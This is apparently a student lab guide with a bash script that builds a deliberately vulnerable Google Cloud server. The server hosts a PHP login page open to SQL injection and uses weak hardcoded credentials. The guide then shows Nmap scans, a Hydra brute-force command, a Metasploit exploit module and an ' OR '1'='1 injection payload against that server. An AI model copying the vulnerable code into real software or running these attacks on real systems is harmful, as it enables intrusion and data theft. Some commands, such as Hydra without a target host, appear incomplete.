An advanced setup script for a **Cloud Instance** that will deploy a vulnerable environment specifically designed for demonstrating ethical hacking tools. This setup will guide you through creating another Google Cloud instance and trying tools like **Nmap**, **Metasploit**, **Burp Suite**, and **Hydra** against realistic scenarios.

---

### **Script to Create a Vulnerable Instance for Ethical Hacking Tool Demonstration**

Save this script as `setup_tool_demo_instance.sh` and execute it on your primary Google Cloud instance.

```bash
#!/bin/bash

# Create a secondary instance for vulnerability demonstration
INSTANCE_NAME="vulnerable-instance"
ZONE="us-central1-a"
MACHINE_TYPE="e2-medium"

echo "Creating a secondary instance ($INSTANCE_NAME)..."
gcloud compute instances create $INSTANCE_NAME \
    --zone=$ZONE \
    --machine-type=$MACHINE_TYPE \
    --image-family=debian-11 \
    --image-project=debian-cloud \
    --boot-disk-size=20GB \
    --tags=vulnerable-server \
    --metadata=startup-script='#!/bin/bash
sudo apt update && sudo apt install -y apache2 php php-mysqli mariadb-server mariadb-client nmap hydra metasploit-framework
sudo systemctl start apache2
sudo systemctl enable apache2
sudo mysql -e "CREATE DATABASE vulnerable_tools;"
sudo mysql -e "CREATE USER '\''vuln_user'\''@'\''localhost'\'' IDENTIFIED BY '\''tool123'\'';"
sudo mysql -e "GRANT ALL PRIVILEGES ON vulnerable_tools.* TO '\''vuln_user'\''@'\''localhost'\'';"
sudo mysql -e "FLUSH PRIVILEGES;"
sudo mysql -e "
USE vulnerable_tools;
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);
INSERT INTO users (username, password) VALUES 
('\''admin'\'', '\''password123'\''), 
('\''testuser'\'', '\''testpass'\'');
";
echo "<?php
\$conn = new mysqli('localhost', 'vuln_user', 'tool123', 'vulnerable_tools');
if (\$conn->connect_error) { die('Connection failed: ' . \$conn->connect_error); }
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$username = \$_POST['username'];
    \$password = \$_POST['password'];
    \$query = \"SELECT * FROM users WHERE username = '\$username' AND password = '\$password'\";
    \$result = \$conn->query(\$query);
    if (\$result->num_rows > 0) { echo '<h1>Login Successful</h1>'; }
    else { echo '<h1>Login Failed</h1>'; }
}
?>
<form method='POST'>
    <label>Username:</label><br>
    <input type='text' name='username'><br>
    <label>Password:</label><br>
    <input type='password' name='password'><br>
    <button type='submit'>Login</button>
</form>" > /var/www/html/login.php
sudo systemctl restart apache2'

echo "Instance created successfully. Access it via external IP once it's ready."
```

---

### **Ethical Hacking Tools to Demonstrate**

#### **1. Nmap**
- **Purpose**: Network scanning to detect open ports and services.
- **Demonstration**:
  - Scan the secondary instance's IP for open ports and services.
    ```bash
    nmap -A <secondary-instance-ip>
    ```
  - Observe the open ports (e.g., 80 for HTTP) and services running.

#### **2. Hydra**
- **Purpose**: Brute-force password attacks on services like SSH or HTTP.
- **Demonstration**:
  - Use Hydra to test the login page of the secondary instance.
    ```bash
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
    ```
  - Observe how Hydra attempts different password combinations.

#### **3. Metasploit**
- **Purpose**: Exploitation framework for discovering and exploiting vulnerabilities.
- **Demonstration**:
  - Exploit an outdated Apache or PHP version on the vulnerable instance.
    ```bash
    msfconsole
    use exploit/multi/http/php_cgi_arg_injection
    set RHOST <secondary-instance-ip>
    set TARGETURI /login.php
    run
    ```
  - Demonstrate shell access or data extraction.

#### **4. Burp Suite**
- **Purpose**: Web application testing for vulnerabilities like XSS, SQL Injection.
- **Demonstration**:
  - Intercept requests to `/login.php` and modify parameters to inject SQL payloads:
    ```
    Username: ' OR '1'='1
    Password: any
    ```
  - Observe how the application responds.

---

### **Demonstration Instructions**

1. **Setup**:
   - Run the `setup_tool_demo_instance.sh` script to create a vulnerable instance.
   - Access the external IP of the secondary instance for testing.

2. **Demonstration**:
   - Begin by explaining the purpose and functionality of each tool.
   - Use each tool against the vulnerabilities on the secondary instance.
   - Show the results and how these tools can exploit misconfigured systems.

3. **Report Writing**:
   - **Introduction**: Brief overview of the tools demonstrated.
   - **Procedure**: Detailed step-by-step for each tool (e.g., commands used).
   - **Observations**: Screenshots of successful scans, attacks, or exploitation.
   - **Recommendations**:
     - Regular patching and updates.
     - Using strong, unique passwords.
     - Configuring firewalls to restrict unnecessary ports.
   - **Conclusion**: Summarize the importance of ethical hacking in securing systems.

---

### **Real-Life Challenge Integration**
1. **Simulate Additional Vulnerabilities**:
   - Modify the PHP login form to include blind SQL injection points.
   - Introduce outdated software versions in the secondary instance.
2. **Advanced Demonstration Scenarios**:
   - Use Burp Suite to craft CSRF attacks on login sessions.
   - Leverage Metasploit for remote code execution.

---

### **Key Takeaways for Students**
1. **Real-World Relevance**: Understand how attackers use tools in live environments.
2. **Defense Strategies**: Learn how to mitigate vulnerabilities identified by these tools.
3. **Practical Knowledge**: Gain hands-on experience with professional tools.

This advanced setup will challenge students with realistic scenarios while providing them with the tools and knowledge to secure systems effectively.